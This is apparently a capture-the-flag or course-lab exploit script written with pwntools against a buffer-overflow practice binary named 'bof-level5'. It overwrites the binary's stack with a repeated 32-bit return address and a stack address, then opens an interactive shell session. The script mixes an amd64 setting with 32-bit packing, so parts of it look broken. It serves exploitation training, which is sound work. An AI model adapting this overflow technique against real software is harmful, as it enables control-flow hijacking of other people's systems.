#!/usr/bin/env python

from pwn import *  # pylint: disable=unused-wildcard-import
import os, sys

context(arch="amd64")

HOST="asdf"
PORT=12345
REMOTE_LIBC="libc.so.6"

BINARY="./bof-level5"
LOCAL_LIBC=os.environ['LIBC'] if 'LIBC' in os.environ else "/lib/x86_64-linux-gnu/libc.so.6"

if "remote" in sys.argv:
    #p = remote(HOST, PORT)
    BINARY="/home/labs/week2/bof-level5/bof-level5"
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass


p = process(BINARY)
#libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-h']  # pylint: disable=assigning-non-slot
    gdb.attach(p, "b *receive_input+31")  # pylint: disable=undefined-variable

########################################################


def exploit():
    log.info("wuddup")

    shell = p32(0x80484cb)

    stack = p32(0xffffd308)

    p.sendline(shell*(128/len(shell)) + stack)
    p.interactive()


########################################################

if __name__ == "__main__":
    exploit()
